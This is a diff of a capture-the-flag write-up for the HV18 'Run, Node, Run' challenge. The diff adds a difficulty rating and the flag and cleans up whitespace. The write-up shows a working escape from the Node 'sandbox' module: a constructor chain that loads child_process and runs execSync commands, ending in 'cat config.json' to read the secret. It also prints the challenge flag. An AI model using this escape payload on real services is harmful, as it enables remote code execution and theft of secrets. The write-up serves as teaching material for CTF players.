@@ -2,11 +2,12 @@
 layout: writeup
 title: 'Day 10: &gt;_ Run, Node, Run'
 level:
-difficulty:
+difficulty: medium
 points:
 categories: []
 tags: []
-flag:
+flag: HV18-YtH3-S4nD-bx5A-Nt4G
+
 ---
 ## Challenge
 
@@ -28,25 +29,25 @@ We are also given the serverside code:
     const {flag, port} = require("./config.json");
     const sandbox = require("sandbox");
     const app = require("express")();
-    
+
     app.use(require('body-parser').urlencoded({ extended: false }));
-    
+
     app.get("/", (req, res) => res.sendFile(__dirname+"/index.html"));
     app.get("/code", (req, res) => res.sendFile(__filename));
-    
+
     app.post("/run", (req, res) => {
-    
+
     	if (!req.body.run) {
     		res.json({success: false, result: "No code provided"});
     		return;
     	}
-    
+
     	let boiler = "const flag_" + require("randomstring").generate(64) + "=\"" + flag + "\";\n";
-    
+
     	new sandbox().run(boiler + req.body.run, (out) => res.json({success: true, result: out.result}));
-    
+
     });
-    
+
     app.listen(port);
 {: .language-js}
 
@@ -58,10 +59,10 @@ We play around a bit but nothing obvious:
 
     >> eval(6+6)
     12
-    
+
     >> Object.keys(this)
     [ 'print', 'console', 'process', 'postMessage' ]
-    
+
     >> Object.getOwnPropertyNames(this)
     [ 'print',
     'console',
@@ -133,7 +134,7 @@ So we can get RCE by inputting the following:
     >>> new Function(
     "return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())"
     )()("child_process").execSync("pwd")
-    
+
     { type: 'Buffer', data: [ 47, 97, 112, 112, 10 ] }
 
 We see that something is returned, but the output isn't very useful to
@@ -144,7 +145,7 @@ us, so we set the child process to inherit stdio from parent by setting
     new Function(
       "return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())"
     )()("child_process").execSync("pwd", {stdio: 'inherit'})
-    
+
     JSON Error (data was "/app
     {"result":"null","console":[]}")
 
@@ -155,7 +156,7 @@ contain our flag:
     new Function(
       "return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())"
     )()("child_process").execSync("ls", {stdio: 'inherit'})
-    
+
     JSON Error (data was "config.json
     config.json~
     docker-compose.yaml
@@ -168,16 +169,16 @@ contain our flag:
     package.json
     run.js
     {"result":"null","console":[]}")
-    
+
     >>>
     new Function(
       "return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())"
     )()("child_process").execSync("cat config.json", {stdio: 'inherit'})
-    
+
     JSON Error (data was "{
     "flag":"HV18-YtH3-S4nD-bx5A-Nt4G",
     "port":3000
     }
-    
+
     {"result":"null","console":[]}")
 
